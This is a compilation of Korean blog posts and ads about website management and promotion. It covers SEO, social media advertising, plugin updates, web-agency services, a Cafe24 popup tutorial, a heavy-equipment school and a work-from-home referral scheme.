사용자들이 있기 때문에, 소셜 미디어의 광고를 통해서 웹사이트로 트래픽을 유입하는 데 집중하는 것이 강하게 권장되는 것입니다.​광고를 하기 좋은 소셜 미디어 플랫폼에는 인스타그램(Instagram), 페이스북(Facebook), 링크드인(LinkedIn) 등이 있으며, 이들 SNS는 웹사이트가 사용할 수 있는 자체적인 광고 프로그램을 갖고 있습니다. 어떠한 플랫폼에서 마케팅을 할 것인지는, 대상 고객층에 따라서 달라져야 합니다. 핵심적인 대상 고객층이 18-24살 사이의 사람들이라면, 가장 좋은 마케팅 플랫폼은 인스타그램입니다. 왜냐하면 해당 나이대의 사용자만 하더라도 10억 명이 넘으며, 주요 사용자 층이 30살 이하의 젊은 사람들이기 때문입니다. 플랫폼에 대한 이해도를 쌓은 후, 소셜 미디어를 통해 홈페이지 방문자 수를 늘려보세요.​​ 03. 주간 단위로 확인해야 하는 사항들 검색엔진최적화와 소셜 미디어 광고가 반드시 해야 하는 대표적인 두 가지의 웹사이트 관리 기법이라면, 주간 단위로 확인해야 하는 사항들도 많이 있습니다. 예를 들자면, 웹사이트의 보안을 최신 상태로 유지하는 것이 중요한데, 무엇보다도 해커들이 사용자 정보와 데이터를 훔쳐가지 못하게 해야 하기 때문입니다. 웹사이트를 취약하게 만들 수 있는 보안상의 허점들은 아주 많이 있으며, 그런 부분을 통해서 누군가가 사이트에 무단으로 접속할 수 있기 때문에, 그런 허점들을 가능한 최소화해야만 합니다. 그리고 워드프레스에서는 보안 플러그인을 사용해서 사용자의 데이터를 보호할 수 있습니다.​여러분의 웹사이트에 보안 플러그인을 추가하기 전에, 우선은 여러분의 웹사이트가 지켜야만 하는 취약점에는 어떤 것들이 있는지를 완전하게 이해해야만 합니다. 악성 소프트웨어에서부터 SSL 인증서의 취약함에 이르기까지 다양한 요소들이 여러분의 웹사이트를 잠재적인 문제에 노출시킬 수 있습니다. 워드프레스, 플러그인, 테마 등의 업데이트 여부를 주간 단위로 확인하면, 이러한 요소들을 언제나 최신 상태로 유지할 수 있으며, 그럼으로써 보안도 더욱 강화됩니다. 테마나 플러그인이 구식 버전이라면 사이버 공격에 더욱 취약할 수밖에 없습니다.​여러분의 웹사이트를 다양한 브라우저와 기기에서 테스트해서 모든 것들이 의도한 대로 작동되고 있는지를 확인하는 것이 좋습니다. 웹사이트를 테스트할 수 있는 도구들은 다양하고도 많은데, 그중에서도 가장 좋은 것으로는 모비레디(mobiReady)라는 것입니다. 모비레디는 웹사이트의 성능을 테스트 하기 위해서 특별히 만들어진 것이며, 웹사이트의 운영자들에게 사이트의 전반적인 성능과 보안을 개선하는 데 사용할 수 있는 분석 리포트를 제공해 줍니다.​​ 04. 최신 디지털 트렌드를 파악하기 웹사이트가 성공할 수 있게 하려면, 수단과 방법을 가리지 않고 최신의 디지털 트렌드를 파악하고 있는 것이 좋습니다. 2020년에는 이러한 트렌드가 인공지능(AI) 기술을 중심으로 진행되고 있는데요. 인공지능은 기업들에게 보다 훌륭한 데이터 인사이트(data insight)를 얻을 수 있게 해주며, 고객의 행동을 보다 효율적으로 이해할 수 있는 머신러닝(machine learning)을 구현할 수 있는 능력도 가지고 있습니다. 이러한 도구를 갖추고 있으면, 웹사이트에서 고객들에게 전달하는 마케팅 수단을 보다 쉽고 정확하게 개인화할 수 있습니다. 웹사이트가 최대한 성공하기 위해서는, 디지털 세계에서의 최신 트렌드를 활용하는 것이 중요합니다.​한편, 기존의 고객들과 잠재 고객들을 위해서 웹사이트를 개선할 수 있는 기술적인 발전에도 초점을 맞추는 것이 필수적입니다. 이메일을 경우에는 개인화하는 것이 중요하며, 그렇게 하면 고객들의 충성도를 높이는 데 크게 도움이 될 수 있습니다. 그리고 고객들에게 제대로 다가가기 위해서 옴니 채널(omni-channel) 마케팅을 활용하는 것도 고려해야 합니다. 이런 유형의 마케팅으로는 여러 다양한 플랫폼을 활용해서 대상 고객층에게 다양한 채널을 통해서 경험을 제공하는 것이 있는데, 이는 소셜 미디어 광고 및 앱 마케팅에서부터 블로그 콘텐츠에 이르기까지 모든 것이 포함될 수 있습니다.​웹사이트를 처음 디자인할 때는, 사이트 방문객들에게 인터랙티브 콘텐츠를 많이 제공하도록 해야 하는데, 사이트를 방문한 사람들이 뉴스레터를 구독하거나 제품을 구매하는 등 사용자들의 참여도를 높일 수 있어야 합니다. 동영상 마케팅 역시 웹사이트의 성공을 위해서 중요한 부분입니다. 이러한 마케팅 요소들이 적절하게 구현된다면, 투자수익률(ROI)을 환상적으로 만들고, 신뢰를 구축하며, 태블릿 및 모바일 사용자들에게 매력을 선보일 수 있습니다. 요즘에는 텍스트를 읽으려는 사람들이 많지 않습니다. 콘텐츠를 간결하게 만드는 게 핵심이며, 그렇기 때문에 동영상과 인터랙티브 한 요소들이 필수적인 것입니다.​​ 05. 제대로 된 도움을 제공하는 전문가를 고용하기 이번 글에서 살펴봤듯이, 웹사이트를 효과적으로 관리하기 위해서 해야 할 일들은 상당히 많습니다. 주기적으로 SEO를 점검하고 소셜 미디어 마케팅 활동을 하는 것은 물론이고, 최신의 디지털 트렌드에 관심을 가지는 것과 지속적으로 사이트의 보안 기능을 업데이트하는 것도 관심을 가져야 하죠. 따라서 홈페이지의 관리를 도와주는 전문가를 고용하는 것이 좋습니다.​외부의 조력자를 고용하면 얻을 수 있는 혜택은 상당히 많습니다. 가장 중요한 것은 비즈니스 본연의 업무에 집중할 수 있게 도와준다는 점인데요. 여러분이 고용하는 전문가들은 웹사이트 관리의 모든 측면들을 처리할 수 있기에 여러분은 그저, 브랜드를 개선하는 것에 주력하면 됩니다. 이는 장기적인 성공에 있어서 필수적인 부분이며, 여러분이 직접 처리할 때 일어날 수 있는 많은 실수들도 방지해 줄 수 있습니다.​​ 홈페이지 관리, 전문가의 도움이 필요하다면? 이미 웹사이트 관리를 시작했거나, 관리에 필요한 업무들을 처리하는 데 어려움을 겪고 있는 경우에도 외부의 조력자를 고용하면 좋습니다. 위시켓에서 여러분의 비즈니스를 도와줄 수 있는 전문 업체를 찾아보세요. 지금, 당장 여러분의 프로젝트를 도와줄 수 있는 8만 이상의 개발업체, 개발 프리랜서들이 활동하고 있습니다. ​ ​ > 이 글은 'Managing Your Website Effectively in 2020'을 각색하여 작성되었습니다. 제이코퍼레이션​안녕하세요. 든든한 IT파트너 제이코퍼레이션입니다.​​만약 유사투자자문 & 대부중개업 을 사업운영을 준비하신다면,당사에서 홈페이지, 랜딩페이지, 고객관리시스템을 한 번에 해결해보세요.​다수의 파트너를 보유하고 있는 저희 제이코퍼레이션에서는다양한 제작 사례와 끊임없이 진보하는 고객관리시스템의 서비스를 제공하고 있습니다.  ​  대출 홈페이지 제작후기 제이코퍼레이션, JCORPORATIONTECH​​ ​제이코퍼레이션에서는 대부중개업 홈페이지를 제작했습니다.제작형태는 원하시는대로 납품이 가능하며사업 운영 계획이 있으시다면 언제든지 편안히 문의주세요!​​홈페이지 / 랜딩페이지 / 고객관리프로그램 / 맞춤형 솔루션 등 다양한 서비스를 제공하는 제이코퍼레이션에서!​  홈페이지 랜딩페이지 제작은 제이코퍼레이션에서​ 비대면 시대의 비즈니스에는 제대로 된 홈페이지가 필수!​ 여러분의 사업이 보다 더 빛이 나도록 최선을 다하겠습니다.​ 언제든지 문의주세요! 친절하게 안내해드리겠습니다.​ 제작 내용이나 기획을 전달해주시면 더 만족스러운 결과를 가져가실 수 있습니다.​ 전체이미지​​ ​​ ​​ ​​ ​​​ ​ ​ ​ ​ 서브페이지 디자인 ​​당신의 비즈니스 정보를 명확히 전달하도록서브/상세페이지 디자인도 최선을 다합니다.​​  ​​ ​ ​ ​ ​ ​ 모바일 반응형 디자인 ​​pc 보다 더 많이 접하는 모바일​제이코퍼레이션에서는 모바일에 최적화된 디자인을 제작해 드립니다.​​ ​ ​​​홈페이지나 랜딩페이지를 의뢰하실 때,아직 생각해 두신 기획이나 아이디어가 없으셔도 문의주세요!​전달하실 문서를 따로 준비하지 않으셔도 좋습니다.​​​  제이코퍼레이션​ [유사투자자문업 특별 이벤트]​홈페이지 + 고객관리시스템 계약시랜딩페이지 + 로고를 무상으로 제공해 드립니다!​ 홈페이지 제작 이벤트 소식 + CRM / 77만원 상당의 랜딩페이지와 로고가 무료! / #유사투자자문 #대부중개업 #제이코퍼레이션 #CRM #디비포스​​​​​랜딩페이지 & 로고 제작 무상 지원(77만원 상당의 무료 혜택)​안녕하세요. 든든한 IT파트...blog.naver.com ​  ​​ ​​기본형 랜딩페이지 제작 비용30만원 / 1회​​ ​유사투자자문전용 디비포스일 4천원 / 월 12만원 / 계정생성무제한​ ​대부중개업전용 디비포스일일당 약 1,670원 / 월당 5만원 (50% 할인) / 계정생성무제한​​ ​  ​ ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리 손쉽게 끝내자  인터넷이 급속도로 발전하는 시대에 살고있는 우리에게는 사업체 혹은 기업체에서 다양한 정보를 제공하는 홈페이지가 필요합니다.브랜드와 내 자신만의 홈페이지를 제작 후 관리를 걱정하시는 여러분들을 위해 몇가지 안내를 해드릴까합니다.회사를 건설하거나 혹은 부푼 마음으로 사업에 처음 발을 내딛었다면 꼭 필요한 홈페이지 제작이 있습니다. 성별을 떠나 누구나 인터넷을 손쉽게 사용할 수 있는 현재 이런 인터넷을 이용하여 소비자들은 브랜드나 나의 기업과 관련된 정보를 얻기를 원합니다.따라서 온라인 마케팅에 있어 핵심이라 볼 수 있는 홈페이지제작이 많은 관심을 받고있는 요즘입니다.처음 홈페이지를 제작할 때 올바른 홈페이지를 개설한다면 뒤에 따르는 홈페이지관리는 어려운 일이 아닙니다.최근 활발한 스마트폰의 사용으로 인해 모바일이 떠오르고 있는 추세입니다.이러한 모바일의 상승은 pc로 접할 수 있는 홈페이지와 더불어 모바일에서도 이용할 수 있는 홈페이지를 제작하는 것이 중요합니다.위와 같은 홈페이지를 반응형 웹이라고 일컫습니다. 반응형 웹홈페이지는 아무리 다양한 디스플레이를 갖춘 모바일 기기라도 사용함에 있어 불편함없이 방문자 유입을 위한 홈페이지 개설방법입니다.반응형 웹 형식의 회사 홈페이지라면 큰 장점이있는데요.하나의 url로 노트북, 스마트폰, 컴퓨터, 태블랫과 같은 기기와 상관없이 편하게 접속할 수 있다는 점이 큰 장점으로 꼽힙니다.소비자의 입장이 아닌 기업의 입장에서 보자면 버전이 다른 홈페이지관리 를 각각 관리하지 않고 한 홈페이지만 관리하므로매우 편리한 방법으로 요즘 많은 관심을 받고있습니다. 따라서 요즘은 흔히들 반응형 홈페이지를 많이들 개설합니다.하지만 컴퓨터에 익숙하지 않은 분이라면 홈페이지를 개설한 후 홈페이지관리에 있어 걱정이 앞서는데요.홈페이지를 처음 개설하신 후 홈페이지관리에 있어 걱정없게끔 충분한 고민 후 업체를 선정하시길 바랍니다.업체와의 다양하고 충분한 커뮤니케이션을 바탕으로 홈페이지 제작에 있어 본인의 입장이 아닌 본인의 홈페이지를 이용하는 소비자의 입장이 되어 홈페이지를 개설하시길 바랍니다.홈페이지관리는 홈페이지개설만큼 중요한 부분입니다. 그렇기에 비용적인 부분을 생각하여 무조건 저렴한 금액의 업체보다는 다양한 업체들과 충분한 커뮤니케이션을 통해 본인과 추구하는 방향이 가장 잘 맞는 업체로 선정하시길 바랍니다.네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가  ​메이크홈즈 간단하게 알려주는 홈페이지 제작 및 관리 필수 정보다른 건 몰라도 이건 꼭 챙겨가야 할 홈페이지 제작 및 관리 대행업체의 서비스 지식   ​재능과 노력. 둘 중 무엇이 더 복인 걸까요? 물론 재능일 수도 있습니다.그렇다고 재능만 있고 노력은 없다면 결국 만족스러운 삶을 살 순 없을 거예요.그런 측면에서 우리는 한결 나은 것 같네요~ 이렇게 홈페이지 제작 및 관리에 대한 정보를 찾아서오셨잖아요. 노력하고 있다는 증명이 아닐까요? 노력하는 여러분을 위해 마련해 봤습니다.   홈페이지 제작 및 관리 대행업체에 홈페이지를 의뢰하면 도메인을 제공해줘요.도메인은 홈페이지의 고유 주소로 연간 단위로 일정 금액을 지불하여 사용하는 것이 특징이에요.   홈페이지 빌더 서비스는 홈페이지를 변형하거나 관리할 경우에 쓰는 툴입니다.이는 홈페이지 제작 및 관리 대행업체에서 제일 대표적으로 제공하는 서비스에 들어갑니다.​그리고 홈페이지 제작 및 관리 대행 회사에서는 호스팅 서비스를 제공한답니다.호스팅 서비스는 홈페이지를 관리하고 운영할 수 있게 해 주는 서비스를 가리킵니다.​은행이나 기타 결제 서비스가 있는 홈페이지는 방화벽 등과 같은 보안 서비스가 필요합니다.홈페이지 제작 및 관리 대행업체에서는 보안존 서비스를 통해 웹 보안 서비스를 제공합니다.   간혹 홈페이지를 운영하다 보면 알 수 없는 장애나 문제점이 일어날 수 있어요.홈페이지 제작 및 관리 대행업체에서는 24시간 항시 이와 같은 장애를 접수하고빠르게 처리할 수 있는 서비스를 제공하고 있기 때문에 안심이에요.​​   ​   홈페이지 제작 및 관리를 대행업체에 맡길 시 특장점에 관해 반드시 알아두세요!   ​홈페이지 제작 관리 대행업체를 이용하시면 도메인과 웹호스팅, 유지 보수까지홈페이지 제작 관리에 관련된 모든 서비스를 경험할 수 있으니까 아주 편리해요.제작 업체와 유지 보수업체가 같으면 수정 속도도 빠르고 커뮤니케이션도 쉽습니다.​홈페이지 제작을 대행업체에 요청할 경우 전문가의 손길로 프로페셔널한 홈페이지가 만들어집니다.수십 년간의 경험과 노하우를 가지고 있는 제작 업체들은 직접 만드시는 홈페이지보다 퀄리티가 바람직합니다.​보안이 막중한 홈페이지의 경우에는 관리 업체를 쓰는 것이 좋습니다.특히 보안 인력이 미흡한 기업은 대행업체를 이용하면저렴한 비용으로 홈페이지의 방화벽 등을 강화해서 안전하게 쓸 수 있죠.​그리고 홈페이지 관리 대행업체를 이용해서 웹페이지를 관리한다면 악성코드를 줄일 수 있죠.보안 서비스가 있기 때문에 악성코드를 제거하고 스팸메일을 없애는 등의편의 기능도 받을 수 있기에 관리가 더욱 수월해진답니다.   또한 홈페이지 관리 대행업체에 관리를 맡기는 경우에는 마케팅에 큰 도움이 됩니다.대행업체 별로 포탈에 사이트를 노출시키는 서비스를 제공하고 있어들어오는 사람의 수가 많아지기 때문에 마케팅에 이익이 될 수 있답니다.​​   ​우리 업체와 매장을 더 쉽게, 더 대대적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 퀄리티의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와드립니다!   업체의 상품과 서비스를 완벽하게 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해주는 곳!인스타그램 등 SNS를 이용한 다양한 광고 마케팅도 병행하여 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 합리적인 견적으로 고객님의 마케팅 비용은 줄여주고!신속 정확한 일처리 및 끊임없는 피드백으로 홈페이지 제작 및 광고 만족도는 높여주고!​지금 메이크홈즈에 문의하셔서 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!궁금했던 점들 많이 알아내셨나요?답답했던 속이 약간은 풀리셨길 바라는 마음으로좋은 정보 계속 알려드릴게요. 이웃 추가해주시고, 또 들러주세요~그럼, 남은 시간 힘내세요!​​​​   네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가#미리캔버스#팝업창만들기#팝업창올리기​미리캔버스라는 사이트를 이번 수업을 통해서 처음 알게 되었는데정말 놀라운 사이트!!이미 만들어진 다양한 아이템을 글자만 바꿔서 저작권 걱정없이 바로 사용할 수 있다!!!​먼저, 네이버에서 미리캔퍼스 검색 바로 시작하기 버튼을 클릭하면,아래와 같은 화면이 나옵니다.모든 템플릿을 통해서 내가 필요한 아이템을 선택하면 되고아니면,내가 처음부터 끝까지 새로 만들 수 있다. 상단에 있는' 설정'을 통해 내가 만들 이미지 크기를 설정하고,(보통 팝업창은 300*350픽셀로 한다고 하네요) 옆에 '제목을 입력하세요'에 내 이미지 파일명을 작성한다.'모든 템플릿'에서 내가 필요한 아이템을 선택,그리고 왼쪽 메뉴바를 통해서배경, 글자등을 수정한다.! 저는 팝업창을 만들 예정으로 텝플릿을 이벤트팝업 중 마음에 드는 디자인 선택설정에서 사이즈를 300*350픽셀파일명은 세일팝업창 입력 ​저는 글자 수정 및 테두리만 수정을 했습니다.우선 글자는수정하고 싶은 글자를 선택하면 자연스럽게 왼쪽에 글자체 선택 창이 뜨고,Delete키를 통해 삭제도 가능! ​우선 기존의 테두리는  Delete키를 사용해서 삭제그리고 요소에 들어가서 내가 맘에 드는 테두리를 클릭하면이미지 창에 뜨고 적당한 사이즈로 늘리거나 줄이면 된다.색상등을 수정하고 싶으면테두리를 선택하면 왼쪽에 창에 색상 선택 창이 뜹니다. 이렇게 수정된 이미지를오른쪽 상단에 메뉴 중 다운로드 클릭파일형식은 jpg 고해상도 다운로드로 저장을한다.저장파일은 내문서(또는 user) > 다운로드 파일에 저장이 됩니다. 저장된 이미지를 카페24에 저장하기우선 ec.cafe24.com 에 로그인해서 들어간다.상단 메뉴 중 상단관리왼쪽 메뉴 중 앱스토어로 가면​ 앱스토에서 들어가면 아래와 같은 창이 나오고그 중, 나는 팝업창을 띄울 예정이므로스마트 팝업 관리> 관리하기 버튼을 클릭! 관리하기에 들어가면 아래와 같은 창이 나오고이미지등록 버튼을 클리하여내가 저장한 파일을 찾아 등록을 한다. 마지막으로 링크미사용 체크그리고 저장!! 저장하면 아래와 같이 등록된 이미지가 나타나면 팝업 등록은 끝!상단에 있는 컴퓨터 모양을 클릭해서 확인하면 됩니다.​ ​ 안양여성인력개발센터경기도 안양시 동안구 경수대로 594 19931207 ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가<<<<<<<<  카테고리에 굴삭기교육영상있습니다 참고 하시기 바랍니다*  [굴삭기 실기] 좋아좋아 홈페이지제작및관리 정보 홈페이지 제작 및 관리를 대행업체에 맡길 시 특장점, 편하게 알아봅시다!    SNS가 활성화되며 실시간으로 나의 일상을 공유하는 사람들이 많아졌습니다.맛있는 음식, 한가로운 카페, 행복한 모임 사진 때문에 부러워하신 적 있으세요?몇 가지 모습을 보고 그 사람을 전부 알 수는 없으니까, 너무 신경 쓰지 마세요.홈페이지제작및관리에 관한 정보도 단편적이 아니라, 이렇게 분명한 것만 드릴게요!    홈페이지 제작 전문기업에 문의해 사이트를 제작한다면 이미지 저작권에서 자유롭답니다.홈페이지를 만들 때 이미지가 많이 필요한데 이러한 업체는 모두 저작권에 문제가 없는이미지들을 보관하고 사용하므로 향후 저작권 소송 등의 문제가 발생할 확률이 적어져요.    그리고 홈페이지 관리 대행업체에 관리를 맡기는 경우 마케팅에도 도움이 되는데,대행업체 별로 포탈에 웹페이지를 노출시키는 서비스를 제공하고 있기 때문에들어오는 사람의 수가 많아질 수 있어 마케팅을 하는데 이익이 될 수 있습니다.또 홈페이지 제작 관리 대행업체를 이용하게 되면 도메인과 웹호스팅, 유지보수까지홈페이지 제작 관리에 관한 모든 서비스를 이용할 수 있어서 무척이나 편리하며,제작업체와 유지보수업체가 같을 경우 수정 속도도 빠르고 커뮤니케이션도 쉽게 할 수 있죠.게다가 홈페이지 관리 대행업체를 통해 사이트 관리를 하면 악성코드를 줄일 수 있어요.자체적인 보안서비스가 있기 때문에 악성코드를 제거하고 스팸메일을 줄여주는 등다양한 편의 기능도 활용할 수 있기 때문에 관리가 한층 수월해진답니다.뿐만 아니라 홈페이지 유지 대행업체는 합리적인 유지보수를 시행하고 있어제작한 페이지를 항상 세련된 상태 그대로 운영할 수 있는 것은 물론,따로 관리 인력을 뽑지 않아도 되므로 경제적이기까지 하니 참고하세요.    홈페이지 제작 및 관리 시 체크사항에 대한 필수 팁 공개!    홈페이지 메인화면은 간단한 형태로 사이트의 내용을 압축해서 보여줘야 합니다.특히 메인페이지만 봐도 홈페이지의 중요한 내용을 알 수 있게 명확한 의미를 전달해야 하죠.그리고 홈페이지 제작 시 네비게이션과 유저인터페이스는 확실하게 사용자 입장에서 체크해야 하며,정보를 직관적으로 발견할 수 있어야 하고 어떤 화면에서든 손쉽게 다른 화면으로 이동이 가능해야 해요.또한 홈페이지의 콘텐츠들은 쉬운 문장으로 명확하게 정보를 전달하는 것이 중요한데요.대충 봐도 모두 이해가 가능할 정도로 심플하고 임팩트있게 구성하는 것이 좋습니다.이와 더불어 마케팅은 홈페이지 제작 시 체크해야 하는 가장 중요한 요소에 해당하며,버튼, 아이콘, 링크 등 고객의 행위를 자극시키는 장치들에 마케팅 역할을 주어야 한답니다.마지막으로 홈페이지를 제작한 다음에는 링크나 맞춤법 등을 점검하는 것이 좋으며,잘못된 링크가 없는지, 오타나 틀린 맞춤법은 없는지 확인을 거친 후에 오픈하시기 바랍니다.  <<<<<<<<  카테고리에 굴삭기교육영상있습니다 참고 하시기 바랍니다*  철저히교육생 중심으로 소통﻿하는 중장비학원 찾는다면?​꿈을 이루는 첫걸음을 자신 있게 내딛게 힘쓰는 김해중장비학원을 소개합니다.20년 전통의 베테랑강사진들로 1:1 맞춤교육, 편리하고 이질감 없는 새로운 장비는 기본!장거리 교육생을 위한 신식 기숙사 완비! 평일과 휴일은 물론 공휴일까지 연중무휴 교육합니다.취업률 UP 타워크레인, 소형건설기계 굴삭기, 지게차, 기중기, 향타기, 로더, 롤러, 불도저, 준설선, 컨테이너 크레인 등 전국에서 가장 많은 종류의 중장비 면허증 교육! 15가지 면허를 한 곳에서 취득해보세요!  ☞자체 시험장 지정 OK! 김해중장비학원! 상담 >> ​​055 - 335 - 8778​경상남도 김해시 유하로 475에 있는 김해중장비학원의 문을 두드려보세요           네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가     헬로우드림  포스팅 시간과  블로그 홈페이지 관리, 여러분은?​  오늘은 헬로우드림 관련한 포스팅 시간과 블로그 홈페이지 관리라는 이야기로 아주 짧게 얘기하겠습니다.사실 오늘 이야기와 제목 선정은 저에게는 어떻게 보면 꽤 까다롭고 내용상으로도 ​어려운? 주제일 수도 있습니다.​​ 벌써 이 제목만으로 검색시 많은 분들이 이 키워드 등으로 관심이 있으신 걸 보실 수 있을 텐데요,​당연히 홍보에 크게 영향이 안될 줄 알지만 어제 상담 관련도 있고, ​포스팅 홍보 방법? 도 생각해 적어보려고요,, 저번에도 말씀드렸지만 어떤 식으로 제 글이 홍보가 될지는, 알 수 없으니까요!이것이 제가 여러 가지로  하나하나 배워나가는 방법 중의 하나이고, 또 헬로우드림 추천인으로서지금이나 나중 후배님한테도 포스팅 쪽으로 지금보다 더 도움드릴 수 있는 자료의 토대가 되니까요^^사실 헬로우드림 포스팅 홍보는 항상 하면서도 어려워요,,신경도 많이 쓰이는 거는 사실이고요,,이보다 쉽고 짧게 손쉽게  홍보하여 수익 내는 방법도  있지만,이것도 포스팅이 바탕이 된 것은  부인할 수 없습니다장기적으로, 긍정적인 생각하며 헬로우드림 포스팅 시간을  즐기려고 노력합니다~저의 후배님들이 볼 정보니까요~ ​어제 헬로우드림 문의 상담을 하던 중(이미 저희 헬로우드림을 하고 계신 분이더라고요 ㅎㅎ) 질문자님이 헬로우드림관련 포스팅 시간이 본인은 3~4시간이 넘을 때도 있다고 하시며, 저는 어떠냐고 물어보셨습니다^^그분이 말한 3시간이,,, 지금 생각해보니 한 번에 계속 앉아서  포스팅을 3~4시간 동안 하셨다는 얘기겠죠?​그분의 말을 듣고,, 솔직하게 저도 얘기를 해 드렸는데요..​저도 처음 시작할 때는, 시간을 정확히 재보지는 않았지만 3시간 4시간 넘게 걸린 적도 있고, 지금도 가끔 4시간 훌쩍 넘게  걸리는 포스팅도 있습니다 하고요,,네,그렇습니다.헬로우드림 홍보에 관한 포스팅 시간은,, 저마다 다를 수 있어요.​저처럼 느리게 작업하는 사람한테는 더 걸릴 수도 있고, 빠른 신 분들은 빠르게 마무리하시겠고요,포스팅,, 어떻게 생각하면 귀찮죠,,하지만 헬로우드림 홈페이지에도 나와 있지만 헬로우드림 포스팅 업무가  수익 창출하는 방법이 되기 때문에포스팅을 절대 무시할 수는 없습니다!어떻게 보면 헬로우드림 홍보 포스팅 시 기본이 되는 것이죠!여러분이 재택알바를 홍보시 여러 홍보 구역에 홍보를 하실 때에도헬로우드림에 관심 있어 하는 분이 이 재택알바에 대한 정보를 볼 수 있는 공간이 필요하니까요! 그런데, 오래 걸릴 수도 있는 헬로우드림에 관한 포스팅 시간 할애와 홍보 ,,,​쉽게 생각하자고요!​​블로그 홈페이지 관리도 하면서 시간 날 때마다 포스팅할 제목, 문구, 자료 모아 모아 놓으셨다가 마무리하시는 걸로요^^중요한 것은 여러분이 헬로우드림을 통해 여러분의 능력을 보여주려고 노력하고  있다는 사실입니다.꼭, 꼭  성과 있을 겁니다!실적이라는 단어를 쓰려니 왠지,,너무 영업적인 느낌이 헬로우드림 포스팅 시간 이 길다고 걱정하시는 분들은 머릿속에 어떻게 글을 쓸 것인가에 대하여 미리 구상도 해보고,자료들도 그것에 맞게 틈 날 때마다 따로 수집해 두시면 ​헬로우드림을 블로그 홈페이지에 홍보시 시간이 좀 줄어들지  않을까 생각합니다. 개인적으로 저는 틈 날 때마다 생각나는 문구라든지,홍보자료 등을 블로그 홈페이지 포스트쓰기에서 임시저장을 해놓고 나중에 마무리하기도 합니다 ,,다른 분들은 어떻게 하시는지?어떻게 보면 가장 기본이 되는 블로그 홈페이지 헬로우드림 포스팅 홍보는 ,,​매일 쓰시는 것이 가장 좋다고 생각하는데요,문제는 시간이고, 더 중요한 것은 포스팅한 글이 ​ 어떻게 노출되고 홍보로 이루어지느냐겠죠!이것이 힘들어지고 안될 때 지치는 거죠!저도 마찬가지입니다.. 그러나, 홍보에 크게 도움 안 된다고 생각해도 계속 테스트도 해보시고 시도해해 보세요!스트레스 많이 받지 마시고, 이거는 기본적으로 해야 된다고 생각하시면 마음이 편합니다!​우리가 매일 식사를 하듯이요,,뭐든지 습관이 중요한 거 같아요​그렇다고 ,헬로우드림 홍보를 하시면서 포스팅에만 시간을 다 매달리라는 얘기는 절대 아닙니다.다른 수익 나는 홍보 방법이 있으니 그 방법을 하면서 해야죠^^하지만, 나중에 어느 정도의 단계가 되면 분명 여러분이 헬로우드림 포스팅 시간에 투자한 노력은 보상을 받을 거예요! 장기적으로 생각하시고,블로그 홈페이지 관리 가 수익으로 연결될 수 있다고 생각하시고 시도해보십시오!​집중해 하다 보면 요령도 터득하고,많이 이것저것 배워나가더라고요!적응되고 홍보할 자료가 쌓이다 보면 재택알바를 위한  블로그 포스팅 시간도 줄어들 거라 개인적으로 생각합니다. ​시간이 들고 오래 걸린다고 포스팅하기를 미루시지 마시고,블로그 홈페이지 관리관리 면에서도  꼭 포스팅 시간 할애해 홍보해 보시라고 권해 드립니다~그러나, 제가 말하는 헬로우드림 홍보시 포스팅은 여러 헬로우드림 추천인들마다 ​​개인 의견이 다를 수 있는 거 알아 두셨으면 좋겠네요.제가 말하는 요지는 기본이 되는 헬로우드림 포스팅 홍보도 열심히 하시면서, 다른  홍보할 수 있는 방법으로 재택알바 홍보하셔서 수익 내라는 것인데,헬로우드림 포스팅은 그 베이스가​ 될  수 있다는 것이죠.예를들면,정회원이되어 헬로우드림 홈페이지를 발급받아그곳에서 수익이 발생하는 것처럼요,,,  저는 헬로우드림 포스팅 시간 (여기서는 올리는 시간) ​을 저녁쯤에 하는 것보다 아침이나 점심때쯤 하는 것이 더 편하고 효과적인 것 같은 느낌이 드는데요, 물론 저 개인적인 거고요,저도 그렇지만, 이 시간에 하시기 힘드신 분들이 많을 텐데요, 위에서 말씀드린 것처럼 틈틈이 임시저장 해놓았다가 아침에 글을 간단히 마무리하시고 올려보시는 것도 괜찮다고 생각하는데,,저녁 늦게 헬로우드림 포스팅을 하여 올리면,​아침에 일어나서 ,본인의 포스팅글을 ​-제가 블로그 최적화라는 그런  단계가 된 게 아니라 - ​​보고 나면  인간이라 실망할 수 있잖아요^^밤에 네이*에서 무슨일이일어 날지 모르니까요^^블로그 홈페이지 관리도 아침에 하실 겸헬로우드림 포스팅을 아침 시간에 마치시면 ,,하루에 나머지 시간을 포스팅에 매달리지 않고 쓸수 있는 장점도 생기더라고요!저도, 요새 블로그 관리를 잘 못하고 있는데시간을 내서도 해야겠다는 생각이 들더라고요헬로우드림 홍보하는 시간이라든지, 홍보 방향 설정, 홍보방법 시간적 활용 하다보니 중요성이 느껴지더라고요!재택알바 헬로우드림을 하면서 짧게 나마 글을 써야 홍보가 되는 것은 진리듯이 포스팅도 처음에 그런 기분으로 써보세요,블로그 홈페이지 관리 도 하시면서  헬로우드림 포스팅 시간을 쓰시면 마음이 한결 편해질 겁니다.그리고, ​ 포스팅 